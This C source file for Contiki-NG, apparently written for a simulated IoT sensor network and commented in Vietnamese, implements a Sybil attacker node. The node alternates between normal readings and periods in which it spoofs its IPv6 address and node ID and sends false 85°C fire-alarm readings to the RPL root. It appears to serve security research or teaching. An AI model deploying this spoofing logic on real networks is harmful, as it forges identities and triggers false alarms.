#include "contiki.h"
#include "net/routing/routing.h"
#include "net/routing/rpl-lite/rpl.h"   
#include "net/netstack.h"
#include "simple-udp.h"
#include "sys/node-id.h"
#include "sys/log.h"
#include "lib/random.h"
#include "net/ipv6/uip-ds6.h"

#define LOG_MODULE "SYBIL"
#define LOG_LEVEL LOG_LEVEL_INFO

#define SEND_PORT 8765

/* Chu kỳ gửi lúc Normal (để thấy được dữ liệu trong 10s) */
#define NORMAL_SEND_INTERVAL (10 * CLOCK_SECOND)
/* Chu kỳ gửi lúc Attack (spam liên tục) */
#define SPAM_INTERVAL        (5 * CLOCK_SECOND)

typedef struct {
  uint16_t cluster_id;
  uint16_t node_id_f;
  uint32_t seqno;
  uint32_t residual_mj;
  uint32_t tx_time;
  int16_t temperature_c;
} sensor_payload_t;

static struct simple_udp_connection udp_conn;
static uint32_t sim_start_time;

PROCESS(sybil_process, "Sybil Attacker Node");
AUTOSTART_PROCESSES(&sybil_process);

PROCESS_THREAD(sybil_process, ev, data)
{
  static struct etimer state_timer;
  static struct etimer send_timer;
  static uint8_t is_attacking = 0;
  static uip_ipaddr_t dest_ipaddr;
  static uint32_t sent_count = 0;
  
  PROCESS_BEGIN();
  sim_start_time = clock_time();

  simple_udp_register(&udp_conn, SEND_PORT, NULL, SEND_PORT, NULL);
  
  /* Bắt đầu ở trạng thái Bình thường (Normal) trong 10 giây */
  LOG_INFO("Normal Node mode (10s)\n");
  is_attacking = 0;
  etimer_set(&state_timer, 10 * CLOCK_SECOND);
  etimer_set(&send_timer, NORMAL_SEND_INTERVAL);

  while(1) {
    PROCESS_WAIT_EVENT();

    if(ev == PROCESS_EVENT_TIMER && data == &state_timer) {
      is_attacking = !is_attacking;

      if(is_attacking) {
         LOG_INFO("Attack Node mode (20s)\n");
         etimer_set(&state_timer, 20 * CLOCK_SECOND);
         etimer_set(&send_timer, SPAM_INTERVAL);
      } else {
         LOG_INFO("Normal Node mode (10s)\n");
         etimer_set(&state_timer, 10 * CLOCK_SECOND);
         etimer_set(&send_timer, NORMAL_SEND_INTERVAL);
         
         /* Khôi phục lại địa chỉ IP thật của node */
         uip_ds6_addr_t *addr_struct = uip_ds6_get_global(-1);
         if (addr_struct != NULL) {
             addr_struct->ipaddr.u16[7] = UIP_HTONS(node_id); 
         }
      }
    }

    if(ev == PROCESS_EVENT_TIMER && data == &send_timer) {
      if(NETSTACK_ROUTING.node_is_reachable() &&
         NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
        
        sensor_payload_t p;
        p.seqno = sent_count++;
        p.residual_mj = 7200;
        p.tx_time = clock_time();

        if(is_attacking) {
            /* Logic tấn công */
            uint16_t spoofed_id = 100 + (random_rand() % 11);
            
            /* Đổi IP nguồn giả mạo */
            uip_ds6_addr_t *addr_struct = uip_ds6_get_global(-1);
            if (addr_struct != NULL) {
                addr_struct->ipaddr.u16[7] = UIP_HTONS(spoofed_id);
            }

            p.cluster_id = 1;
            p.node_id_f = spoofed_id;
            p.temperature_c = 850; /* 85.0 độ C -> Báo cháy */

            LOG_INFO("ATTACK_TX spoof_id=%u ip_suffix=%04x temp=%d seq=%lu\n",
                     spoofed_id, spoofed_id, p.temperature_c, (unsigned long)p.seqno);
        } else {
            /* Logic bình thường */
            p.cluster_id = (node_id <= 26) ? 1 : 2;
            p.node_id_f = node_id;
            p.temperature_c = (int16_t)(250 + (random_rand() % 50)); /* 25.0 - 30.0 độ C */
            
            LOG_INFO("NORMAL_TX node=%u temp=%d seq=%lu\n",
                     node_id, p.temperature_c, (unsigned long)p.seqno);
        }

        simple_udp_sendto(&udp_conn, &p, sizeof(p), &dest_ipaddr);

      } else {
        LOG_INFO("TXFAIL network unreachable\n");
      }

      /* Đặt lại timer cho gói tin tiếp theo */
      if(is_attacking) {
          etimer_set(&send_timer, SPAM_INTERVAL);
      } else {
          etimer_set(&send_timer, NORMAL_SEND_INTERVAL);
      }
    }
  }
  PROCESS_END();
}
